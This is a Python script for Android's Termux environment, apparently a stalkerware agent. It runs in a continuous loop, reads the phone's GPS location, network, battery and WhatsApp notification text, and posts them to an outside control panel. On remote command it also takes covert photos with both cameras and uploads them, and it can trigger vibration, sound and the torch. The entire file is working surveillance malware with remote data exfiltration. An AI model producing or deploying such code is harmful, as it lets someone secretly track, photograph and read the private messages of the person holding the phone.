import time
import subprocess
import json
import requests
import os
import uuid
import base64
from datetime import datetime

URL_SERVIDOR = "https://nexos-panel.onrender.com/update"
URL_UPLOAD_LOTE = "https://nexos-panel.onrender.com/api/upload_lote"
URL_PING = "https://nexos-panel.onrender.com/"
ARQUIVO_ID = os.path.expanduser("~/.nexos_device_id")

def run(cmd, timeout=5):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip()
    except:
        return ""

def obter_id():
    if os.path.exists(ARQUIVO_ID):
        with open(ARQUIVO_ID) as f: return f.read().strip()
    novo = f"NX-{str(uuid.uuid4())[:6].upper()}"
    with open(ARQUIVO_ID, "w") as f: f.write(novo)
    return novo

DEVICE_ID = obter_id()

print("\n" + "="*50)
print(f"🛰️  MOTOR NEXOS DUAL STREAM CARD OPERACIONAL")
print(f"🔑  SEU MONITOR ID DE PROD: {DEVICE_ID}")
print("="*50 + "\n")

ultima_lat = -16.6869
ultima_lon = -49.2648
gps_ok = False
inicio = datetime.now()
ultimo_ping = 0
ultimo_whatsapp = 0

def obter_rede():
    w = run("termux-wifi-connectioninfo")
    if w:
        try:
            i = json.loads(w)
            s = i.get("ssid","")
            if s and s != "<unknown ssid>": return f"WiFi: {s}"
        except: pass
    return "Dados Moveis"

def obter_gps():
    global ultima_lat, ultima_lon, gps_ok
    out = run("termux-location -p gps -r once", timeout=6)
    if out:
        try:
            d = json.loads(out)
            lat = d.get("latitude")
            lon = d.get("longitude")
            if lat and lon and float(lat) != 0 and float(lon) != 0:
                ultima_lat = float(lat)
                ultima_lon = float(lon)
                gps_ok = True
                return
        except: pass
    gps_ok = False

def obter_whatsapp():
    """Ler notificações do WhatsApp"""
    global ultimo_whatsapp
    agora = time.time()
    if agora - ultimo_whatsapp < 30:
        return []
    
    notif = run("termux-notification-list", timeout=5)
    if notif:
        try:
            dados = json.loads(notif)
            msgs = []
            for n in dados:
                pkg = n.get("packageName", "")
                if "whatsapp" in pkg.lower():
                    msgs.append({
                        "titulo": n.get("title", "")[:50],
                        "texto": n.get("content", "")[:100],
                        "hora": n.get("when", "")
                    })
            ultimo_whatsapp = agora
            return msgs[:5]
        except:
            pass
    return []

def executar_comando(acao):
    """Executa comandos remotos"""
    print(f"   🔧 Executando: {acao}")
    if acao == "vibrar":
        run("termux-vibrate -d 1000", timeout=3)
    elif acao == "som":
        run("termux-media-player play scan", timeout=3)
    elif acao == "lanterna":
        run("termux-torch on", timeout=3)
        time.sleep(2)
        run("termux-torch off", timeout=3)
    elif acao == "tela":
        run("input keyevent 26", timeout=3)  # Power button
    elif acao == "volume_max":
        run("termux-volume music 15", timeout=3)

def enviar_dados(payload):
    json_str = json.dumps(payload).replace("'", "'\\''")
    cmd = f"curl -s -X POST '{URL_SERVIDOR}' -H 'Content-Type: application/json' -d '{json_str}' --connect-timeout 5 --max-time 5"
    resp = run(cmd, timeout=6)
    try:
        return json.loads(resp)
    except:
        return None

def capturar_foto(num, arquivo):
    if os.path.exists(arquivo):
        os.remove(arquivo)
    try:
        subprocess.run(f"termux-camera-photo -c {num} {arquivo}", shell=True, timeout=6)
        time.sleep(1.5)
        if os.path.exists(arquivo) and os.path.getsize(arquivo) > 100:
            with open(arquivo, "rb") as f:
                return base64.b64encode(f.read()).decode('utf-8')
    except:
        pass
    return None

def enviar_lote(front_b64, back_b64):
    if not front_b64 and not back_b64:
        return False
    payload = {
        "device_id": DEVICE_ID,
        "photo_front": front_b64 or "",
        "photo_back": back_b64 or ""
    }
    try:
        r = requests.post(URL_UPLOAD_LOTE, json=payload, timeout=20)
        return r.status_code == 200
    except:
        return False

print("🛰️  INICIADO (GPS + WhatsApp + Comandos)\n")

while True:
    t0 = time.time()
    
    # PING a cada 4 min
    agora = time.time()
    if agora - ultimo_ping > 240:
        run(f"curl -s -o /dev/null --connect-timeout 10 --max-time 15 {URL_PING}", timeout=12)
        ultimo_ping = agora
    
    # BATERIA
    bat = "N/A"
    out = run("termux-battery-status")
    if out:
        try: bat = str(json.loads(out).get("percentage", "N/A"))
        except: pass
    
    # GPS
    obter_gps()
    
    # REDE
    rede = obter_rede()
    
    # WHATSAPP
    msgs_whats = obter_whatsapp()
    
    # ENVIA DADOS
    payload = {
        "device_id": DEVICE_ID,
        "battery": bat,
        "uptime": str(datetime.now() - inicio).split('.')[0],
        "lat": ultima_lat,
        "lon": ultima_lon,
        "network": rede,
        "whatsapp": msgs_whats
    }
    
    resp = enviar_dados(payload)
    
    dt = time.time() - t0
    icone = "📍" if gps_ok else "📡"
    
    if resp and resp.get("status") == "success":
        comando_cam = resp.get("comando_cam", "wait")
        comando_remoto = resp.get("comando_remoto", "none")
        print(f"{icone} [{datetime.now().strftime('%H:%M:%S')}] Bat:{bat}% {rede} | {dt:.1f}s")
        
        # WhatsApp
        if msgs_whats:
            print(f"   💬 {len(msgs_whats)} novas msgs WhatsApp")
        
        # Comandos Remotos
        if comando_remoto != "none":
            executar_comando(comando_remoto)
        
        # Fotos
        if comando_cam == "take_dual":
            print("📸 [DUAL] Tirando as duas fotos...")
            arq_tras = os.path.expanduser("~/nexos_back.jpg")
            arq_front = os.path.expanduser("~/nexos_front.jpg")
            
            b64_tras = capturar_foto(0, arq_tras)
            print(f"   {'✅' if b64_tras else '❌'} Traseira")
            time.sleep(0.3)
            b64_front = capturar_foto(1, arq_front)
            print(f"   {'✅' if b64_front else '❌'} Frontal")
            
            if b64_tras or b64_front:
                if enviar_lote(b64_front, b64_tras):
                    print("   ✅ LOTE ENVIADO!")
                else:
                    print("   ❌ Falha")
            
            for a in [arq_tras, arq_front]:
                if os.path.exists(a): os.remove(a)
    else:
        print(f"📡 [{datetime.now().strftime('%H:%M:%S')}] Offline | {dt:.1f}s")
    
    time.sleep(2.0)
